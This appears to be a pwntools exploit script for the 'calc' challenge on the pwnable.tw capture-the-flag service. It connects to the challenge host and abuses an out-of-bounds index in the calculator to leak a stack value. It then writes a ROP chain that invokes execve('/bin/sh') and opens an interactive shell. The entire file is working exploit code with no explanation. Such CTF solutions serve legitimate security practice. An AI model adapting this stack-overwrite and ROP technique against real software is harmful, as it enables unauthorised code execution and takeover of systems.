#!/usr/bin/env python

from pwn import *

r = remote("chall.pwnable.tw", 10100)
# r = process('./calc')

pop_eax = 0x0805c34b
pop_edx_ecx_ebx = 0x080701d0
syscall = 0x08049a21

def change(idx, old, val):
    chg = abs(old - val)
    if old > val:
        r.sendline('+{} - {}'.format(idx, chg))
    elif old < val:
        r.sendline('+{} + {}'.format(idx, chg))

r.recvuntil('=== Welcome to SECPROG calculator ===\n')

stack = [pop_eax, 11, pop_edx_ecx_ebx, 0, 0, 0xdeadbeef, syscall, u32('/bin'), u32('/sh\x00')]

r.sendline('+360')
stack[5] = int(r.recvline()[:-1])

for i in range(361, 370):
    r.sendline('+{}'.format(i))
    change(i, int(r.recvline()[:-1]), stack[i - 361])
    log.info(r.recvline()[:-1])

r.interactive()
